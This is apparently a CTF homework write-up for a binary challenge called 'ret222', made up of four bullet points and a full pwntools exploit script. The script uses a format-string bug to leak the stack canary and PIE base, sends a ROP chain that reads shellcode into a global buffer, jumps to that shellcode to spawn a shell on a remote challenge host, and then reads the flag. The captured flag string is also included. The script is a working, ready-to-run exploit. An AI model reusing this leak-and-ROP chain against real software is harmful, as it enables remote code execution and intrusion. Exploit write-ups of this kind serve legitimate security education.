# HW0
## ret222 150
* `Fmt` to leak `PIE base` and `Canary`, then we already bypass the `PIE` and `SSP`.
* Stack overflow to do `ROP`.
* ROP do the things that read more bytes to `name[16]`.
* Jump to name -> Jump to shellcode.

```python
#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *
import sys

# FLAG{YOU_ARE_REALLY_SMART!!!!!!}

context.arch = 'amd64'

e = ELF('./ret222')

host , port = 'csie.ctf.tw' , 10122

y = remote(host,port)


def set_name( name ):
    y.sendafter( '>' , '1\n' )
    y.sendafter( 'name:' , name )

def set_data( data ):
    y.sendafter( '>' , '3\n' )
    y.sendafter( 'data:' , data + '\n' )


def sho():
    y.sendafter( '>' , '2\n' ) 

name = 0x202020
gets = 0x908
pop_rdi = 0xda3
main = 0xc00

''' for finding the args offset of printf
for i in range( 100 ):
    set_name( '%{}$p\n\n'.format( i + 1 ) + 'a' * 10 )
    sleep(0.5)
    sho()
    y.recvuntil('Name:')
    o = y.recvline().strip()
    if 'nil' in o :
        pie = 0
    else: pie = int( o , 16 )
    log.success( '{} -> {}'.format( i + 1 , hex( pie ) ) )

'''

set_name( '%23$p\n\n' )
sho()

y.recvuntil('Name:')
canary = p64( int( y.recvline().strip() , 16 ) )
log.success( 'Canary -> {}'.format( hex( u64( canary ) ) ) )

set_name( '%24$p\n\n' )
sho()

y.recvuntil('Name:')
pie = int( y.recvline().strip() , 16 ) - 0xd40
log.success( 'PIE -> {}'.format( hex( pie ) ) )

p = 'a' * 0x88
p += flat(
    canary,
    'RBBBBBBP',
    pie + pop_rdi,
    pie + name,
    pie + gets,
    pie + main
) 

set_data( p )

y.sendafter( '>' , '4\n' )

sleep(1)
y.sendline( asm( shellcraft.sh() ) )
sleep(1)

p = 'a' * 0x88
p += flat(
    canary,
    'RBBBBBBP',
    pie + name,
) 

set_data( p )

y.sendafter( '>' , '4\n' )

y.sendline( 'cat /home/`whoami`/flag' )


y.interactive()
```